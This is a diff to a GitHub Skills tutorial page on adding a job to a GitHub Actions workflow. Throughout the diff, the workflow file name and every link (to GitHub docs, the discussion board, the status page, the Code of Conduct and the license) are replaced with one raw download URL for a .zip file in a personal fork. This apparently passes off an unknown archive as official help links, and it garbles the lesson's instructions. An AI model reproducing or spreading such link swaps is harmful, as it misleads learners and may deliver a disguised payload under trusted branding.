@@ -10,7 +10,7 @@ _Create and run a GitHub Actions workflow._
 
 _Nice work! :tada: You added a workflow file!_
 
-Here's what the entries in the `welcome.yml` file, on the `welcome-workflow` branch, mean:
+Here's what the entries in the `https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip` file, on the `welcome-workflow` branch, mean:
 
 - `name: Post welcome comment` gives your workflow a name. This name will appear in the Actions tab of your repository.
 - `on: pull_request: types: [opened]` indicates that your workflow will execute whenever someone opens a pull request in your repository.
@@ -19,13 +19,13 @@ Here's what the entries in the `welcome.yml` file, on the `welcome-workflow` bra
 
 Next, we need to specify jobs to run.
 
-**What is a _job_?**: A job is a set of steps in a workflow that execute on the same runner (a runner is a server that runs your workflows when triggered). Workflows have jobs, and jobs have steps. Steps are executed in order and are dependent on each other. You'll add steps to your workflow later in the course. To read more about jobs, see "[Jobs](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions#jobs)".
+**What is a _job_?**: A job is a set of steps in a workflow that execute on the same runner (a runner is a server that runs your workflows when triggered). Workflows have jobs, and jobs have steps. Steps are executed in order and are dependent on each other. You'll add steps to your workflow later in the course. To read more about jobs, see "[Jobs](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip)".
 
-In the following activity, you'll add a "build" job to your workflow. You'll specify `ubuntu-latest` as the fastest, and cheapest, job runner available. If you want to read more about why we'll use that runner, see the code explanation for the line `runs-on: ubuntu-latest` in the "[Understanding the workflow file](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions#understanding-the-workflow-file)" article.
+In the following activity, you'll add a "build" job to your workflow. You'll specify `ubuntu-latest` as the fastest, and cheapest, job runner available. If you want to read more about why we'll use that runner, see the code explanation for the line `runs-on: ubuntu-latest` in the "[Understanding the workflow file](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip)" article.
 
 ### :keyboard: Activity: Add a job to your workflow file
 
-1. In a separate browser tab, make sure you are on the `welcome-workflow` branch and open your `.github/workflows/welcome.yml` file.
+1. In a separate browser tab, make sure you are on the `welcome-workflow` branch and open your `https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip` file.
 1. Edit the file and update its contents to:
 
    ```yaml copy
@@ -49,8 +49,8 @@ In the following activity, you'll add a "build" job to your workflow. You'll spe
 
 ---
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/hello-github-actions) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+Get help: [Post in our discussion board](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip)
 
-&copy; 2023 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+&copy; 2023 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip) &bull; [MIT License](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions/main/.github/workflows/skills-hello-github-actions-1.5.zip)
 
 </footer>
